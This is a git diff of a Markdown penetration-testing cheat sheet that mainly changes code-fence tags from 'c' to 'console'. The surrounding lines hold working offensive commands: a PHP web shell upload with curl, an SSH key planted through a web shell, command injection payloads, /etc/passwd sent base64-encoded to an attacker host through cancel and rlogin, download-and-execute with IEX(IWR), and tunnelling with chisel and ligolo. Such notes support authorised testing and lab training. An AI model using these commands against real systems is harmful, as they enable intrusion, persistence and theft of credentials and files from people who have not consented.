@@ -172,13 +172,13 @@
 
 ### List available Versions
 
-```c
+```console
 C:\> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
 ```
 
 ## 2to3
 
-```c
+```console
 $ 2to3 <OLD_PYTHON_SCRIPT>.py -w <NEW_PYTHON_SCRIPT>.py
 $ 2to3-2.7 <OLD_PYTHON_SCRIPT>.py -w <NEW_PYTHON_SCRIPT>.py
 ```
@@ -187,19 +187,19 @@ $ 2to3-2.7 <OLD_PYTHON_SCRIPT>.py -w <NEW_PYTHON_SCRIPT>.py
 
 ### List Files in Archive and Technical Information
 
-```c
+```console
 $ 7z l -slt <FILE>
 ```
 
 ### Extract Archive
 
-```c
+```console
 $ 7z x <FILE>
 ```
 
 ## adb (Andoid Debug Bridge)
 
-```c
+```console
 $ adb connect <RHOST>:5555
 $ adb shell
 $ adb devices
@@ -208,7 +208,7 @@ $ adb install <file>.apk
 
 ### Set Proxy
 
-```c
+```console
 $ adb shell settings put global http_proxy <LHOST>:<LPORT>
 ```
 
@@ -216,7 +216,7 @@ $ adb shell settings put global http_proxy <LHOST>:<LPORT>
 
 ### Unpacking .deb Files
 
-```c
+```console
 $ ar x <FILE>.deb
 ```
 
@@ -224,19 +224,19 @@ $ ar x <FILE>.deb
 
 ### Interactive Shell sdterr to sdtout
 
-```c
+```console
 $ ash -i 2>&1
 ```
 
 ## ack
 
-```c
+```console
 $ ack -i '<STRING>'    // like password
 ```
 
 ## ASCII
 
-```c
+```console
 $ man ascii
 ```
 
@@ -244,23 +244,23 @@ $ man ascii
 
 ### Use . as Seperator
 
-```c
+```console
 $ awk -F. '{print $1}' <FILE>
 ```
 
 ### Field Seperator is ":" and it prints the output from Row 3
 
-```c
+```console
 $ awk -F':' '{print $3}'
 ```
 
 ### Print Line Number 1 and 42
 
-```c
+```console
 $ awk 'NR==1 || NR==42'
 ```
 
-```c
+```console
 $ awk '{print "http://<LHOST>/documents/" $0;}' ../files.txt | xargs -n 1 -P 16 wget  -q -P /PATH/TO/FOLDER/
 ```
 
@@ -268,19 +268,19 @@ $ awk '{print "http://<LHOST>/documents/" $0;}' ../files.txt | xargs -n 1 -P 16 
 
 ### Execute Privilege
 
-```c
+```console
 $ bash -p
 ```
 
 ## Bash Listening Ports
 
-```c
+```console
 $ S=(- ESTABLISHED SYN_SENT SYN_RECV FIN_WAIT1 FIN_WAIT2 TIME_WAIT CLOSE CLOSE_WAIT LAST_ACK LISTEN CLOSING);hex2ipport(){ printf '%d.%d.%d.%d:%d\n' $(echo $1|awk -F: '{print $1}'|sed 's/../0x& /g'|awk '{print $4" "$3" "$2" "$1}') 0x$(echo $1|awk -F: '{print $2}');};cat /proc/net/tcp|tail -n +2|while read L;do echo $(hex2ipport $(echo $L|awk '{print $2}')) $(hex2ipport $(echo $L|awk '{print $3}')) ${S[$(( 0x$(echo $L|awk '{print $4}') ))]};done
 ```
 
 ## Bash POSIX
 
-```c
+```console
 $ sls -b '
 > bash -p'
 bash-4.3$
@@ -290,13 +290,13 @@ bash-4.3$
 
 ### Accessing WebDAV
 
-```c
+```console
 $ cadaver http://<RHOST>/webdav
 ```
 
 ## capsh
 
-```c
+```console
 $ capsh --print
 ```
 
@@ -304,7 +304,7 @@ $ capsh --print
 
 ### Copy Files
 
-```c
+```console
 $ certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 ```
 
@@ -312,7 +312,7 @@ $ certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 
 ### BSD
 
-```c
+```console
 $ cat /etc/changelist
 ```
 
@@ -324,25 +324,25 @@ $ cat /etc/changelist
 
 #### Server
 
-```c
+```console
 $ ./chisel server -p 9002 -reverse -v
 ```
 
 #### Client
 
-```c
+```console
 $ ./chisel client <LHOST>:9002 R:3000:127.0.0.1:3000
 ```
 
 ##### With PowerShell Start-Process (saps)
 
-```c
+```console
 PS C:\> saps 'C:\chisel.exe' 'client <LHOST>:9002 R:3000:127.0.0.1:3000'
 ```
 
 #### Forwaord multiple Ports at once
 
-```c
+```console
 $ ./chisel client <LHOST>:9002 R:8001:127.0.0.1:8001 R:8002:127.0.0.1:8002 R:8003:127.0.0.1:8003
 ```
 
@@ -350,13 +350,13 @@ $ ./chisel client <LHOST>:9002 R:8001:127.0.0.1:8001 R:8002:127.0.0.1:8002 R:800
 
 #### Server
 
-```c
+```console
 $ ./chisel server -p 9002 -reverse -v
 ```
 
 #### Client
 
-```c
+```console
 $ ./chisel client <LHOST>:9002 R:socks
 ```
 
@@ -364,7 +364,7 @@ $ ./chisel client <LHOST>:9002 R:socks
 
 ### SUID Bit
 
-```c
+```console
 $ chmod +s <FILE>
 $ chmod u+s <FILE>
 $ chmod 4777 <FILE>
@@ -372,19 +372,19 @@ $ chmod 4777 <FILE>
 
 ## gcc
 
-```c
+```console
 $ gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
 ```
 
 ### Linux
 
-```c
+```console
 $ gcc -m32|-m64 -o output source.c
 ```
 
 ### Windows
 
-```c
+```console
 $ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 ```
 
@@ -394,7 +394,7 @@ $ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 
 Paste directly to the Shell.
 
-```c
+```bash
 function __wget() {
     : ${DEBUG:=0}
     local URL=$1
@@ -429,13 +429,13 @@ function __wget() {
 
 #### Usage
 
-```c
+```console
 __wget http://<LHOST>/<FILE>
 ```
 
 ### curl Version
 
-```c
+```bash
 function __curl() {
   read proto server path <<<$(echo ${1//// })
   DOC=/${path// //}
@@ -454,7 +454,7 @@ function __curl() {
 
 ### Usage
 
-```c
+```console
 __curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ```
 
@@ -462,13 +462,13 @@ __curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 
 ### Generate Core Dump
 
-```c
+```console
 $ kill -BUS <PROCESS_ID>
 ```
 
 ### Extract Core Dump
 
-```c
+```console
 $ apport-unpack /var/crash/_<PATH/TO/CRASHED/PROCESS>_<PROCESS>.1000.crash /PATH/TO/FOLDER/
 ```
 
@@ -476,7 +476,7 @@ $ apport-unpack /var/crash/_<PATH/TO/CRASHED/PROCESS>_<PROCESS>.1000.crash /PATH
 
 ### Common Commands
 
-```c
+```console
 $ curl -v http://<DOMAIN>                                                        // verbose output
 $ curl -X POST http://<DOMAIN>                                                   // use POST method
 $ curl -X PUT http://<DOMAIN>                                                    // use PUT method
@@ -493,31 +493,31 @@ $ curl${IFS}<LHOST>/<FILE>                                                      
 
 ### Headers
 
-```c
+```console
 $ curl -vvv <RHOST>
 ```
 
 or
 
-```c
+```console
 $ curl -s -q -v -H 'Origin: http://<RHOST>' <DOMAIN>/api/auth
 ```
 
 ### Use SSL
 
-```c
+```console
 $ curl -k <RHOST>
 ```
 
 ### Use Proxy
 
-```c
+```console
 $ curl --proxy http://127.0.0.1:8080
 ```
 
 ### Web Shell Upload
 
-```c
+```console
 $ curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://<RHOST>/PATH/TO/DIRECTORY/<FILE>.php
 $ curl -X PUT -T /usr/share/webshells/aspx/cmdasp.aspx "http://<RHOST>/sh.aspx"
 $ curl -X MOVE -H "Destination: http://<RHOST>/sh.aspx" http://<RHOST>/sh.txt
@@ -525,37 +525,37 @@ $ curl -X MOVE -H "Destination: http://<RHOST>/sh.aspx" http://<RHOST>/sh.txt
 
 ### SSH Key Upload
 
-```c
+```console
 $ curl -G 'http://<RHOST>/<WEBSHELL>.php' --data-urlencode 'cmd=echo ssh-rsa AAAA--- snip --- 5syQ > /home/<USERNAME>/.ssh/authorized_keys'
 ```
 
 ### Command Injection
 
-```c
+```console
 $ curl -X POST http://<RHOST>/select --data 'db=whatever|id'
 ```
 
 ### File upload from local Web Server to Remote System
 
-```c
+```console
 $ curl http://<LHOST>/nc.exe -o c:\users\<USERNAME>\nc.exe
 ```
 
 ### File Download via Command Injection
 
-```c
+```console
 $ curl --silent -X POST http://<RHOST>/select --data 'db=whatever|cat /home/bob/ca/intermediate/certs/intermediate.cert.pem' | grep -zo '\-\-.*\-\-' > intermediate.cert.pem
 ```
 
 ### Get Server Time
 
-```c
+```console
 $ curl --head http://<RHOST>/
 ```
 
 ### curl Injection with Burp Suite
 
-```c
+```console
 -o /var/www/html/uploads/shell.php http://<LHOST>/shell.php
 ```
 
@@ -563,7 +563,7 @@ $ curl --head http://<RHOST>/
 
 ### Banner Grabbing
 
-```c
+```console
 $ dig version.bind CHAOS TXT @<RHOST>
 $ dig ANY @<RHOST> <DOMAIN>
 $ dig A @<RHOST> <DOMAIN>
@@ -576,14 +576,14 @@ $ dig -x <RHOST> @<RHOST>
 
 ### Zone Transfer
 
-```c
+```console
 $ dig axfr @<RHOST>
 $ dig axfr @<RHOST> <DOMAIN>
 ```
 
 ### Dir
 
-```c
+```console
 C:\> dir flag* /s /p
 C:\> dir /s /b *.log
 ```
@@ -592,7 +592,7 @@ C:\> dir /s /b *.log
 
 ### Starting Container and mount Directory on Host
 
-```c
+```console
 $ docker run -it -v $(pwd):/app <CONTAINER>
 ```
 
@@ -607,7 +607,7 @@ $ ./install.sh
 
 ## dos2unix
 
-```c
+```console
 $ dos2unix <FILE>.sh
 ```
 
@@ -615,7 +615,7 @@ $ dos2unix <FILE>.sh
 
 ### Files which changed in the last 2 Minutes
 
-```c
+```console
 $ dpkg -V 2>/dev/null
 ```
 
@@ -623,7 +623,7 @@ $ dpkg -V 2>/dev/null
 
 ### Remove "\n"
 
-```c
+```console
 $ echo -e "string\n" > <FILE>
 ```
 
@@ -631,27 +631,27 @@ $ echo -e "string\n" > <FILE>
 
 ### Search for IPv6 Addresses
 
-```c
+```console
 $ egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))'
 ```
 
 ## Environment Variables
 
-```c
+```console
 $ env
 $ echo $PATH
 ```
 
 ### Export Path
 
-```c
+```console
 $ echo $PATH
 $ export PATH=`pwd`:$PATH
 ```
 
 ## faketime
 
-```c
+```console
 $ faketime 'last friday 5 pm' /bin/date
 $ faketime '2008-12-24 08:15:42' /bin/date
 $ faketime -f '+2,5y x10,0' /bin/bash -c 'date; while true; do echo $SECONDS ; sleep 1 ; done'
@@ -661,19 +661,19 @@ $ faketime -f '+2,5y i2,0' /bin/bash -c 'date; while true; do date; sleep 1 ; do
 
 ### Proxychains and Kerberos
 
-```c
+```console
 $ proxychains faketime -f +1h kinit -V -X X509_user_identity=FILE:admin.cer,admin.key administrator@WINDCORP.HTB
 ```
 
 ## fg
 
-```c
+```console
 $ fg
 ```
 
 ## file
 
-```c
+```console
 $ file <file>
 ```
 
@@ -685,66 +685,66 @@ $ file <file>
 
 #### To the Target
 
-```c
+```console
 $ bash -c "cat < /dev/tcp/<RHOST>/<RPORT> > <FILE>"
 $ nc -lnvp <LPORT> > <FILE>
 ```
 
 #### From the Target
 
-```c
+```console
 $ bash -c "cat < <FILE> > /dev/tcp/<RHOST>/<RPORT>" 
 $ nc -lnvp <LPORT> > <FILE>
 ```
 
 ### cancel
 
-```c
+```console
 $ nc -nlvp 18110
 $ cancel -u "$(cat /etc/passwd | base64)" -h <LHOST>:<LPORT>
 ```
 
 ### rlogin
 
-```c
+```console
 $ rlogin -l "$(cat /etc/passwd | base64)" -p <LPORT> <LHOST>
 ```
 
 ### Linux to Windows
 
-```c
+```console
 PS C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>/<LOCAL_DIRECTORY>/<FILE>','C:\Users\<USERNAME>\Documents\<FILE>')"
 ```
 
 ### Windows to Linux
 
-```c
+```console
 $ impacket-smbserver <SHARE> . -smb2support
 ```
 
-```c
+```console
 C:\> copy * \\<LHOST>\<SHARE>
 ```
 
 #### Authenticated
 
-```c
+```console
 $ impacket-smbserver -smb2support share <FOLDER> -user <USERNAME> -password <PASSWORD>
 ```
 
-```c
+```console
 C:\> net use n: \\<LHOST>\share /user:<USERNAME> <PASSWORD>
 ```
 
 ### Windows to Linux using Invoke-Webrequest
 
-```c
+```console
 PS C:\> powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
 ```
 
 #### Short Version
 
-```c
+```console
 PS C:\> iwr <LHOST>/<FILE> -o <FILE>
 PS C:\> iwr <LHOST>/<FILE> -o <FILE> -useb
 PS C:\> iwr <LHOST>/<FILE> -o <FILE> -UseBasicParsing
@@ -755,7 +755,7 @@ PS C:\> IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
 
 ### FTP Server
 
-```c
+```console
 $ sudo msfconsole
 msf6 > use auxiliary/server/ftp
 msf6 auxiliary(server/ftp) > set FTPROOT /home/kali/htb/machines/sauna/serve/
@@ -766,7 +766,7 @@ msf6 auxiliary(server/ftp) > exploit
 
 ## Filetypes
 
-```c
+```console
 .php
 .html
 .txt
@@ -3218,56 +3218,56 @@ msf6 auxiliary(server/ftp) > exploit
 
 ## find
 
-```c
+```console
 $ find . -type f
 ```
 
 ### Line Count
 
-```c
+```console
 $ find . -type f -exec wc -l {} \; | sort -nr
 ```
 
 ### Find not empty Files
 
-```c
+```console
 $ find results -not -empty -ls
 ```
 
 ### Show Permissions
 
-```c
+```console
 $ find . -type d -ls
 ```
 
 ## findmnt
 
-```c
+```console
 $ findmnt
 ```
 
 ## for loop
 
-```c
+```console
 $ for i in $(seq 0 30); do ssh -i ~/.ssh/id_rsa root@<RHOST>; sleep 1; done
 ```
 
 ### Generate simple List
 
-```c
+```console
 $ for i in `seq 1 100`; do echo $i; done
 ```
 
 ## FTP
 
-```c
+```console
 $ ftp <RHOST>
 $ ftp -A <RHOST>
 ```
 
 ### Common Commands
 
-```c
+```console
 ftp> dir      // lsit all files and directories
 ftp> ls -a    // list all files (even hidden) (yes, they could be hidden)
 ftp> binary   // set transmission to binary instead of ascii
@@ -3277,26 +3277,26 @@ ftp> bye      // exit
 
 ### Anonymous Login
 
-```c
+```console
 Username: anonymous
 Password: anonymous
 ```
 
 ### Browser Connection
 
-```c
+```console
 ftp://anonymous:anonymous@<RHOST>
 ```
 
 ### Passive Mode
 
-```c
+```console
 $ ftp -p <RHOST>    // passive mode for firewall evasion
 ```
 
 ### Download all files from FTP
 
-```c
+```console
 $ wget -r ftp://anonymous:anonymous@<RHOST>
 $ wget -m ftp://anonymous:anonymous@<RHOST>
 $ wget -m --no-passive ftp://anonymous:anonymous@<RHOST>
@@ -3304,19 +3304,19 @@ $ wget -m --no-passive ftp://anonymous:anonymous@<RHOST>
 
 ### Scan for detailed Output
 
-```c
+```console
 $ nmap -sC -sV -p 21 -vvv <RHOST>
 ```
 
 ### Fixing 229 Entering Extended Passive Mode
 
-```c
+```console
 ftp> passive
 ```
 
 ## getent
 
-```c
+```console
 $ getent passwd
 ```
 
@@ -3324,7 +3324,7 @@ $ getent passwd
 
 ### Read ACL Permissions
 
-```c
+```console
 $ getfacl <DIRECTORY>
 ```
 
@@ -3332,13 +3332,13 @@ $ getfacl <DIRECTORY>
 
 > https://github.com/sbp/gin
 
-```c
+```console
 $ ./gin /PATH/TO/REPOSITORY
 ```
 
 ## Git
 
-```c
+```console
 $ git show-branch
 $ git log <BRANCH> --oneline
 $ git show <COMMIT>
@@ -3346,13 +3346,13 @@ $ git show <COMMIT>
 
 ## Gitea
 
-```c
+```console
 $ git push http://<TOKEN>@<RHOST>:3000/<USERNAME>/<REPOSITORY>.git
 ```
 
 ## glab
 
-```c
+```console
 $ glab auth login
 ```
 
@@ -3366,7 +3366,7 @@ $ glab auth login
 
 > https://go.dev/dl/
 
-```c
+```console
 $ sudo rm -rf /usr/local/go
 $ sudo tar -C /usr/local -xzf /PATH/TO/FILE/go1.21.3.linux-amd64.tar.gz
 $ echo $PATH | grep "/usr/local/go/bin"
@@ -3374,22 +3374,28 @@ $ echo $PATH | grep "/usr/local/go/bin"
 
 ### Environment Variables
 
-```c
+```console
 $ export PATH=$PATH:/usr/local/go/bin
 $ export GO111MODULE=on
 ```
 
-```c
+```console
 $ export GOROOT=/usr/local/go
 $ export GOPATH=$HOME/go
 $ export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+```
+
+```console
+$ export GOPATH=$HOME/go
+$ export PATH="$HOME/go/bin:$PATH"
+$ export PATH=$PATH:$GOROOT/bin:$GOPATH/bin
 ```
 
 ## goshs
 
 ### Common Commands
 
-```c
+```console
 $ goshs -i <LHOST> -p <LPORT> -d /PATH/TO/DIRECTORY/
 $ goshs -i <LHOST> -p <LPORT> -d /PATH/TO/DIRECTORY/ -b <USERNAME>:<PASSWORD>
 $ goshs -i <LHOST> -p <LPORT> -d /PATH/TO/DIRECTORY/ -si -b <USERNAME>:<PASSWORD>
@@ -3397,7 +3403,7 @@ $ goshs -i <LHOST> -p <LPORT> -d /PATH/TO/DIRECTORY/ -si -b <USERNAME>:<PASSWORD
 
 ### Copy File to the Server
 
-```c
+```console
 $ curl -F database=@./database.db -u <USERNAME>:<PASSWORD> http://<LHOST>/upload
 ```
 
@@ -3405,34 +3411,34 @@ $ curl -F database=@./database.db -u <USERNAME>:<PASSWORD> http://<LHOST>/upload
 
 ### Common Commands
 
-```c
+```console
 $ gpg -k
 $ gpg -K
 ```
 
 ### Decryption
 
-```c
+```console
 $ gpg --use-agent --decrypt <FILE>.gpg > <FILE>
 $ gpg --homedir /home/<USERNAME>/.gnupg --pinentry-mode=loopback --use-agent --decrypt <FILE>.gpg > <FILE>
 ```
 
 ## grep
 
-```c
+```console
 $ grep -rai '<FOOBAR>'           // also grep through binaries
 $ grep -v                        // remove string from output
 $ grep -Hnri <FILE> * | vim -    // pipe output into a new vim buffer
 $ grep "$_" * | grep -v "_SERVER\|_SESSION"    // \| equals "or" in grep
 ```
 
-```c
+```console
 $ grep -oP '<UNWANTED>\K<OUTPUT-THIS>(?=UNWANTED)'
 ```
 
 or
 
-```c
+```console
 $ grep -oP '".*php"'
 ```
 
@@ -3445,51 +3451,51 @@ $ grep -oP '".*php"'
 
 #### Example
 
-```c
+```console
 echo 'aaaaabbbbbccccc' | grep -Po 'a+\Kb+(?=c+)'
 bbbbb
 ```
 
 ### Search for IPv4 Addresses
 
-```c
+```console
 $ grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
 ```
 
 ### Extended Seach
 
-```c
+```console
 $ grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b|<search_parameter_2>"
 ```
 
 ### Enumerate JavaScript Files
 
-```c
+```console
 $ curl http://<DOMAIN>/js/chunk-vendors~03631906.67e21e66.js | grep -oP '/api/[^"]*'
 ```
 
 ## grpc
 
-```c
+```console
 $ pip3 install grpc
 $ pip3 install grpc-tools
 ```
 
 ### Skeleton File Structure
 
-```c
+```console
 syntax = "proto3";
 
 message Content {
-	    string data = 1;
+        string data = 1;
 }
 
 message Data {
-	    string feed = 1;
+        string feed = 1;
 }
 
 service Print {
-	    rpc Feed(Content) return (Data) {}
+        rpc Feed(Content) return (Data) {}
 }
 
 $ python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. file.proto
@@ -3497,7 +3503,7 @@ $ python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. file.proto
 
 ## host
 
-```c
+```console
 $ host <RHOST>
 $ host <DOMAIN>
 $ host -l <DOMAIN> <RHOST>
@@ -3505,13 +3511,13 @@ $ host -l <DOMAIN> <RHOST>
 
 ## icacls
 
-```c
+```console
 $ icacls <FILE>
 ```
 
 ## IMAP
 
-```c
+```console
 c1 LOGIN <USERNAME> <PASSWORD>
 c2 LIST
 ```
@@ -3520,7 +3526,7 @@ c2 LIST
 
 > https://ipython.org/
 
-```c
+```console
 $ ipython3
 ```
 
@@ -3528,7 +3534,7 @@ $ ipython3
 
 ### Compiling java.class
 
-```c
+```console
 $ javac <FILE>.java
 $ javac -d . <FILE>.java
 ```
@@ -3537,11 +3543,11 @@ $ javac -d . <FILE>.java
 
 > https://www.java.com/de/download/manual.jsp
 
-```c
+```console
 $ sudo cp -R jre1.8.0_381 /usr/lib/jvm/
 ```
 
-```c
+```console
 $ cat /etc/environment
 # START KALI-DEFAULTS CONFIG
 # Everything from here and until STOP KALI-DEFAULTS CONFIG
@@ -3559,23 +3565,23 @@ DOTNET_CLI_TELEMETRY_OPTOUT=1
 # STOP KALI-DEFAULTS CONFIG
 ```
 
-```c
+```console
 $ sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jre1.8.0_381/bin/java" 0
 ```
 
-```c
+```console
 $ sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jre1.8.0_381/bin/javac" 0
 ```
 
-```c
+```console
 $ sudo update-alternatives --set java /usr/lib/jvm/jre1.8.0_381/bin/java
 ```
 
-```c
+```console
 $ sudo update-alternatives --set java /usr/lib/jvm/jre1.8.0_381/bin/javac
 ```
 
-```c
+```console
 $ sudo update-alternatives --config java
 ```
 
@@ -3583,7 +3589,7 @@ $ sudo update-alternatives --config java
 
 ### Formatting JSON Files
 
-```c
+```console
 for file in *.json; do jq . "$file" > "$file.tmp" && mv "$file.tmp" "$file"; done
 ```
 
@@ -3593,26 +3599,26 @@ for file in *.json; do jq . "$file" > "$file.tmp" && mv "$file.tmp" "$file"; don
 
 #### Installation
 
-```c
+```console
 $ sudo apt-get install krb5-kdc
 ```
 
 #### Request Ticket with Impacket
 
-```c
+```console
 $ impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'
 ```
 
 #### Ticket Export
 
-```c
+```console
 $ export KRB5CCNAME=<FILE>.ccache
 $ export KRB5CCNAME='realpath <FILE>.ccache'
 ```
 
 #### Common Information & Commands
 
-```c
+```console
 /etc/krb5.conf                   // kerberos configuration file location
 kinit <USERNAME>                 // creating ticket request
 klist                            // show available kerberos tickets
@@ -3628,19 +3634,19 @@ kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the key
 
 ### Debug
 
-```c
+```console
 KRB5_TRACE=/dev/stdout kinit -X X509_user_identity=FILE:admin.cer,admin.key Administrator@<DOMAIN>
 ```
 
 ### Fix Error Message: ldap3.core.exceptions.LDAPPackageUnavailableError: package gssapi (or winkerberos) missing
 
-```c
+```console
 $ sudo apt-get install heimdal-dev
 ```
 
 ## ldd
 
-```c
+```console
 $ ldd /bin/ls
 ```
 
@@ -3648,7 +3654,7 @@ $ ldd /bin/ls
 
 ### Disable Line Wrapping
 
-```c
+```console
 $ | less -s
 ```
 
@@ -3656,7 +3662,7 @@ $ | less -s
 
 ### Common Commands
 
-```c
+```console
 $ lftp -u <USERNAME>,<PASSWORD> <RHOST>
 lftp <USERNAME>@<RHOST>:~> user <USERNAME>
 lftp <USERNAME>@<RHOST>:~> dir
@@ -3666,17 +3672,17 @@ lftp <USERNAME>@<RHOST>:~> put <FILE>
 
 ### Force SSL Verification
 
-```c
+```console
 lftp <USERNAME>@<RHOST>:~> ftp:ssl-force true
 ```
 
 ### Disable SSL Verification
 
-```c
+```console
 lftp <USERNAME>@<RHOST>:~> set ssl:verify-certificate off
 ```
 
-## Ligolo-ng
+## Ligolo
 
 > https://github.com/nicocha30/ligolo-ng
 
@@ -3684,54 +3690,54 @@ lftp <USERNAME>@<RHOST>:~> set ssl:verify-certificate off
 
 > https://github.com/nicocha30/ligolo-ng/releases
 
-```c
+```console
 $ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz
 $ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz
 ```
 
 ### Prepare Tunnel Interface
 
-```c
+```console
 $ sudo ip tuntap add user $(whoami) mode tun ligolo
 ```
 
-```c
+```console
 $ sudo ip link set ligolo up
 ```
 
 ### Setup Proxy on Attacker Machine
 
-```c
+```console
 $ ./proxy -laddr <LHOST>:443 -selfcert
 ```
 
 ### Setup Agent on Target Machine
 
-```c
+```console
 $ ./agent -connect <LHOST>:443 -ignore-cert
 ```
 
 ### Configure Session
 
-```c
+```console
 ligolo-ng » session
 ```
 
-```c
+```console
 [Agent : user@target] » ifconfig
 ```
 
-```c
+```console
 $ sudo ip r add 172.16.1.0/24 dev ligolo
 ```
 
-```c
+```console
 [Agent : user@target] » start
 ```
 
 ### Port Forwarding
 
-```c
+```console
 [Agent : user@target] » listener_add --addr 0.0.0.0:<LPORT> --to <LHOST>:80 --tcp 
 [Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
 ```
@@ -3742,13 +3748,13 @@ $ sudo ip r add 172.16.1.0/24 dev ligolo
 
 #### Set Password
 
-```c
+```console
 $ passwd <USERNAME>
 ```
 
 #### Rename a User
 
-```c
+```console
 $ usermod -l <NEW_USERNAME> -d /home/<NEW_USERNAME> -m <OLD_USERNAME>
 $ groupmod -n <NEW_USERNAME> <OLD_USERNAME>
 $ ln -s /home/<NEW_USERNAME> /home/<OLDUSERNAME>
@@ -3756,13 +3762,13 @@ $ ln -s /home/<NEW_USERNAME> /home/<OLDUSERNAME>
 
 ##### Optional: Change Display Name
 
-```c
+```console
 $ chfn -f "GIVENNAME SURNAME" <NEW_USERNAME>
 ```
 
 #### User Profile Files for Execution on Login
 
-```c
+```console
 .bashrc
 .profile
 .bash_profile
@@ -3770,7 +3776,7 @@ $ chfn -f "GIVENNAME SURNAME" <NEW_USERNAME>
 
 ### Common Commands
 
-```c
+```console
 $ w
 $ last -a
 $ lsof -i
@@ -3782,7 +3788,7 @@ $ sudo -l    // check sudo permissions
 
 ### Network Enumeration
 
-```c
+```console
 $ watch ss -tp
 $ netstat -ant
 $ netstat -tulpn
@@ -3793,7 +3799,7 @@ $ ping -c 3 <RHOST>
 
 ### Processes
 
-```c
+```console
 $ ps -aux
 $ ps -auxf
 $ ps -eaf
@@ -3803,9 +3809,9 @@ $ cd /proc/<PROCESS_ID>
 
 ## Logfiles
 
-### Check for User Activity
+### Webserver Access Logfile
 
-```c
+```console
 $ cd /var/log/apache2
 $ grep <RHOST> access.log
 ```
@@ -3816,31 +3822,31 @@ Add them to either the `.bashrc` or to the `.zshrc`.
 
 ### Bash: local IP address
 
-```c
+```console
 PS1="[`date  +"%Y-%m-%d %H:%M"`]\[\033[01;31m\] `ip a | grep -A 1 eth0 | grep inet | awk '{ print $2 }' | cut -d '/' -f 1`\[\033[00m\] \[\033[01;34m\]\w\[\033[00m\] \$ "
 ```
 
 ### Bash: external IP address
 
-```c
+```console
 PS1='[`date  +"%Y-%m-%d %H:%M"`]\[\033[01;31m\] `curl -s ifconfig.co`\[\033[00m\] \[\033[01;34m\]\w\[\033[00m\] \$ '
 ```
 
 ### ZSH: local IP address
 
-```c
+```console
 PS1="[20%D %T] %B%F{red}$(ip a | grep -A 1 eth0 | grep inet | awk '{ print $2 }' | cut -d '/' -f 1)%f%b %B%F{blue}%1~%f%b $ "
 ```
 
 ### ZSH: external IP address
 
-```c
+```console
 PS1="[20%D %T] %B%F{red}$(curl -s ifconfig.co)%f%b %B%F{blue}%1~%f%b $ "
 ```
 
 ### ZSH: Kali Prompt with local IP address
 
-```c
+```console
 PROMPT="%F{white,bold}%W %* $(ip a | grep -A 1 eth0 | grep inet | awk '{ print $2 }' | cut -d '/' -f 1)"$'%F{%(#.blue.green)}\n┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n'$prompt_symbol$'%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '
 ```
 
@@ -3848,7 +3854,7 @@ PROMPT="%F{white,bold}%W %* $(ip a | grep -A 1 eth0 | grep inet | awk '{ print $
 
 For `PowerShell` paste it into the open terminal.
 
-```c
+```console
 $IPv4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address; function prompt{ "PS" + " [$(Get-Date)] $IPv4> $(get-location) " }
 ```
 
@@ -3856,25 +3862,25 @@ $IPv4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandPrope
 
 ### Ping
 
-```c
+```console
 C:\> ping -n 1 <RHOST>
 ```
 
 ### Set Environment Variables
 
-```c
+```console
 C:\> sysdm.cpl
 ```
 
 ### Hide a File
 
-```c
+```console
 C:\> attrib +h <FILE>
 ```
 
 ### Command Format for PowerShell
 
-```c
+```console
 $ echo "<COMMAND>" | iconv -t UTF-16LE | base64 -w 0
